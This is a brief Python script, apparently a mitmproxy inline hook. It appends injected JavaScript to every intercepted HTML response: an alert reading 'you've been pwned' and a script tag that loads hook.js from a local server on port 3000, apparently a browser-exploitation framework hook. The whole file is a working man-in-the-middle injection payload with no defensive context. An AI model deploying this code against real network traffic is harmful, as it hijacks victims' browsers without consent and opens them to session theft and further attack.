def response(context, flow):
  if 'Content-Type' in flow.response.headers and "text/html" in flow.response.headers['Content-Type']:
    flow.response.content += "<script>alert('you\'ve been pwned')</script>"
    flow.response.content += "<script src='http://127.0.0.1:3000/hook.js'></script>"